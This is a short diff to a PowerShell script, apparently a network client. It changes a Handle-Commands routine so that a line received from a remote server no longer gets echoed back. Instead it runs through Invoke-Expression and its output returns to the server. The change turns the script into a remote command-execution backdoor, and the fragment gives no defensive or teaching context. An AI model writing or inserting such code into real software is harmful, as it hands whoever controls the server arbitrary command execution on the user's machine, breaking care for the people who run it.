@@ -25,8 +25,9 @@ function Handle-Commands {
         if ($client.Connected) {
             if ($networkStream.DataAvailable) {
                 $command = $reader.ReadLine()
-                # send back command value
-                $writer.WriteLine($command)
+                #execute command in shell and send output back to server
+                $output = Invoke-Expression $command
+                $writer.WriteLine($output)
                 $writer.Flush()
                 $client.Close()
             }
